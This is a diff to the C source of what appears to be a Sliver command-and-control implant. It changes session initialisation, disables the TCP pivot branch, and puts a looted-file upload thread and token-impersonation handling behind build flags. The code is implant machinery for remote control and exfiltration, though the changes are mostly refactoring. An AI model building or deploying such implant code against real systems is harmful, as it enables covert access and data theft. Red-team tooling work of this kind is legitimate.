@@ -7,7 +7,7 @@ PSLIVER_SESSION_CLIENT SessionInit
 {
 	PSLIVER_SESSION_CLIENT pSession = NULL;
 	UINT64 uReconnectDuration = 300;
-	DWORD dwPollInterval = 1.5;
+	DWORD dwPollInterval = 1;
 
 	pSession = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
 	pSession->pGlobalConfig = pGlobalConfig;
@@ -15,11 +15,11 @@ PSLIVER_SESSION_CLIENT SessionInit
 	if (pGlobalConfig->Type == Session) {
 		if (pGlobalConfig->Protocol == Http) {
 			pSession->Init = (CLIENT_INIT)HttpInit;
-			pSession->Start = HttpStart;
-			pSession->Send = HttpSend;
-			pSession->Receive = HttpRecv;
-			pSession->Close = HttpClose;
-			pSession->Cleanup = HttpCleanup;
+			pSession->Start = (CLIENT_START)HttpStart;
+			pSession->Send = (SEND_ENVELOPE)HttpSend;
+			pSession->Receive = (RECV_ENVELOPE)HttpRecv;
+			pSession->Close = (CLIENT_CLOSE)HttpClose;
+			pSession->Cleanup = (CLIENT_CLEANUP)HttpCleanup;
 		}
 		else {
 			FREE(pSession);
@@ -27,7 +27,7 @@ PSLIVER_SESSION_CLIENT SessionInit
 			goto CLEANUP;
 		}
 	}
-	else if (pGlobalConfig->Type == Pivot) {
+	/*else if (pGlobalConfig->Type == Pivot) {
 		if (pGlobalConfig->Protocol == Tcp) {
 			pSession->Init = (CLIENT_INIT)TcpInit;
 			pSession->Start = TcpStart;
@@ -49,7 +49,7 @@ PSLIVER_SESSION_CLIENT SessionInit
 			pSession = NULL;
 			goto CLEANUP;
 		}
-	}
+	}*/
 	else {
 		FREE(pSession);
 		pSession = NULL;
@@ -304,7 +304,10 @@ CONTINUE:
 		goto CLEANUP;
 	}
 
-	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SliverUploadLootedFile, pSession, 0, &dwThreadID);
+	if (pConfig->Loot) {
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SliverUploadLootedFile, pSession, 0, &dwThreadID);
+	}
+
 	dwNumberOfAttempts = 0;
 	while (TRUE) {
 #ifndef _DEBUG
@@ -312,7 +315,7 @@ CONTINUE:
 			goto CLEANUP;
 		}
 #endif
-		if (dwNumberOfAttempts >= pSession->pGlobalConfig->dwMaxFailure) {
+		if (dwNumberOfAttempts >= pSession->pGlobalConfig->dwMaxConnectionErrors) {
 			goto CLEANUP;
 		}
 
@@ -331,27 +334,26 @@ CONTINUE:
 #ifdef _DEBUG
 		if (pEnvelope->pData != NULL && pEnvelope->pData->cbBuffer > 0) {
 			PrintFormatW(L"Receive Envelope:\n");
-			if (pEnvelope->pData->cbBuffer > 0x800) {
-				HexDump(pEnvelope->pData->pBuffer, 0x800);
-			}
-			else {
-				HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
-			}
+			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 		}
 		else {
 			PrintFormatW(L"Receive Envelope: []\n");
 		}
-#endif	
+#endif
 		pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
 		pWrapper->pSession = pSession;
 		pWrapper->pEnvelope = pEnvelope;
+#ifdef _FULL
 		if (pEnvelope->uType == MsgMakeTokenReq || pEnvelope->uType == MsgRevToSelfReq || pEnvelope->uType == MsgImpersonateReq) {
 			SessionWork(NULL, pWrapper, NULL);
 		}
 		else {
+#endif
 			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)SessionWork, pWrapper, &pSliverPool->CallBackEnviron);
 			TpPostWork(pWork);
+#ifdef _FULL
 		}
+#endif
 	SLEEP:
 		Sleep(pSession->dwPollInterval * 1000);
 	}
@@ -378,7 +380,6 @@ VOID FreeSessionClient
 			pSession->Cleanup(pSession->lpClient);
 		}
 		
-		FreeGlobalConfig(pSession->pGlobalConfig);
 		FREE(pSession);
 	}
 }
